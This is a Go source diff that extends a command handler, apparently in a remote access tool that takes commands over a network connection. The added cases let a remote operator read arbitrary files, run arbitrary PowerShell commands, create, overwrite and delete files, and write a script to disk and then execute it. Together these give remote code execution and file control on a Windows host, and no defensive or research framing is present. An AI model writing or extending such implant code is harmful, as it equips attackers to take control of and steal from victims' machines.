@@ -6,6 +6,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 )
@@ -83,11 +84,18 @@ func runCommand(cmd string) (output string) {
 			return err.Error()
 		}
 		for _, file := range files {
-			fileList += file.Name()
-			if file.IsDir() {
-				fileList += "\\"
+			fileInfo, err := os.Lstat(file.Name())
+			if err != nil {
+				return err.Error()
+			}
+			fileList += fmt.Sprintf("%-32v", file.Name())
+			if file.IsDir() == false {
+				fileList += fmt.Sprintf("%v bytes", fileInfo.Size())
 			}
 			fileList += "\n"
+		}
+		if fileList == "" {
+			return "Directory is empty."
 		}
 		return fileList
 
@@ -96,10 +104,101 @@ func runCommand(cmd string) (output string) {
 		if err != nil {
 			return err.Error()
 		}
-		return "Directory changed to " + runCommand("pwd")
+		return fmt.Sprintf("Directory changed to %v", runCommand("pwd"))
+
+	case "cat":
+		content, err := os.ReadFile(args)
+		if err != nil {
+			return err.Error()
+		}
+		if string(content) == "" {
+			return "File is empty."
+		}
+		return string(content)
+
+	case "ps":
+		stdout, err := exec.Command("powershell.exe", args).Output()
+		if err != nil {
+			return err.Error()
+		}
+		if string(stdout) == "" {
+			return fmt.Sprintf("Executed powershell.exe %v successfully.", args)
+		}
+		return string(stdout)
+
+	case "touch":
+		file, err := os.Create(args)
+		if err != nil {
+			return err.Error()
+		}
+
+		err = file.Close()
+		if err != nil {
+			return err.Error()
+		}
+		
+		return fmt.Sprintf("Created %v successfully.", args)
+
+	case "write":
+		filename, content, found := strings.Cut(args, " ")
+		if found != true {
+			return "Invalid syntax."
+		}
+
+		file, err := os.Create(filename)
+		if err != nil {
+			return err.Error()
+		}
+
+		_, err = file.WriteString(content)
+		if err != nil {
+			return err.Error()
+		}
+
+		err = file.Close()
+		if err != nil {
+			return err.Error()
+		}
+
+		return fmt.Sprintf("Written to %v successfully.", filename)
+
+	case "display":
+		filename, content, found := strings.Cut(args, " ")
+		if found != true {
+			return "Invalid syntax."
+		}
+
+		file, err := os.Create(filename)
+		if err != nil {
+			return err.Error()
+		}
+
+		_, err = file.WriteString(content)
+		if err != nil {
+			return err.Error()
+		}
+
+		err = file.Close()
+		if err != nil {
+			return err.Error()
+		}
+
+		stdout, err := exec.Command("powershell.exe", ".\\"+filename).Output()
+		if err != nil {
+			return err.Error()
+		}
+
+		return fmt.Sprintf("Displayed %s from %v successfully.", stdout, filename)
+
+	case "remove":
+		err := os.Remove(args)
+		if err != nil {
+			return err.Error()
+		}
+		return fmt.Sprintf("Removed %v successfully", args)
 
 	default:
-		return cleanCmd + " is not a valid command.\n"
+		return fmt.Sprintf("%v is not a valid command\n", cleanCmd)
 	}
 }
 
